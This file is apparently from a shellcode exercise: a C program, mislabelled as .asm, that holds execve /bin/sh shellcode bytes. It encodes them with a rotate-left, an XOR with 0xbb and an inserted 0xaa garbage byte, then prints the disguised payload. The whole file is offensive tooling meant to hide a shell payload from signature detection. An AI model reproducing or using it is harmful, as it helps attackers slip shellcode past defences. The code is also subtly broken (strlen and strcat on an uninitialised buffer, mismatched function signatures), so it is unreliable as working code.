// Filename: insertion_xor_rol_encoder.asm
// Purpose: Encode a shellcode using XOR, ROL and insertion 

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h> // to get 32bit-wide rotates, regardless of the size of the int
#include <limits.h> // for CHAR_BIT
#include <string.h>

uint32_t rol3(uint32_t, unsigned int);

int main(void) {

    unsigned char shellcode[] =    
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

    // declare an unsigned char array for the encoded shellcode. It needs to be two times the size of the original shellcode to leave enough space for the garbage bytes. 
    unsigned char encoded_shellcode[((strlen(shellcode) * 2))];     

    // Initialize encoded_shellcode to zero
    for (int g = 0; g < (strlen(encoded_shellcode)); g++)
        encoded_shellcode[g] = '\0';

    // ROL and XOR each byte
    for (int i = 0; i < strlen(shellcode); i++) {
        shellcode[i] = rol3(shellcode[i], 3);
        shellcode[i] = shellcode[i] ^ 0xbb;
    }

    // Insert garbage byte
    int j = 0;
    while (j < strlen(shellcode)) {
        strncat(encoded_shellcode, shellcode + j, 1);
        strcat(encoded_shellcode, "\xaa");
        j++;
    }

    // Print result
    printf("Encoded shellcode: \"");
    for (int k = 0; k < (strlen(shellcode) * 2); k++) {
        printf("\\x");
        printf("%02x", encoded_shellcode[k]);
    }
    printf("\"\n\n");

    printf("Encoded shellcode 2: \"");
    for (int l = 0; l < (strlen(shellcode) * 2); l++) {
        printf("0x");
        printf("%02x,", encoded_shellcode[l]);
    }
    printf("\"\n");

    printf("\nLength of encoded shellcode: %d\n", strlen(encoded_shellcode));

    return 0;
}

uint32_t rol3(uint32_t value, uint32_t count) {

    return (value << count) | (value >> (8 - count));
}

